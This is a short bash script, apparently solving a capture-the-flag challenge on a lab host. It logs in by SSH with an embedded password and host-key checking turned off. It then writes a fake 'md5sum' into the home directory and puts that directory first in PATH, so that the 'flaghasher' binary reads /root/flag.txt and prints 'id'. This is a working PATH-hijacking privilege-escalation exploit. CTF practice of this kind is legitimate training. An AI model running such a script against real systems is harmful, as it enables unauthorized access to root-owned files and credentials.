#!/bin/bash
export SSHPASS=e301b3ec
SSH="sshpass -e ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 30054 ctf-player@chatelaine.cylabacademy.net"
echo "=== test direct ==="
$SSH "./flaghasher" 2>&1 | tail -5
echo "=== avec faux md5sum ==="
$SSH 'printf "#!/bin/sh\ncat /root/flag.txt 2>/dev/null; cat /flag.txt 2>/dev/null; id\n" > $HOME/md5sum; chmod +x $HOME/md5sum; export PATH=$HOME:$PATH; ./flaghasher' 2>&1 | tail -12
